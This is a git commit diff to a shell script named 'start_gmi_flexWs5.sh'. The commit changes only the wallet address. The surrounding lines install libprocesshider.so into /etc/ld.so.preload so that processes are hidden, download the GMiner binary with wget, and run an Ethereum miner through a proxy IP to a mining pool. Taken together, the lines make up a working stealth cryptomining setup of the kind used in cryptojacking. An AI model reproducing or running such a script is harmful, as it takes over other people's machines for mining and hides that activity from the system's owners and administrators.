4b0618755a7b77ba733b1aa1ceb7ebfdb250fd81
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-17 16:54:00 +0200

    Update start_gmi_flexWs5.sh

--- start_gmi_flexWs5.sh
+++ start_gmi_flexWs5.sh
@@ -7,4 +7,4 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz
 tar -xvf gminer_2_56_linux64.tar.xz
-./miner --algo ethash --server eth-us-west.flexpool.io --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684.gminer --ssl 1 --port 5555 --pass x --proxy 18.117.128.68:9999
+./miner --algo ethash --server eth-us-west.flexpool.io --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a.gminer --ssl 1 --port 5555 --pass x --proxy 18.117.128.68:9999
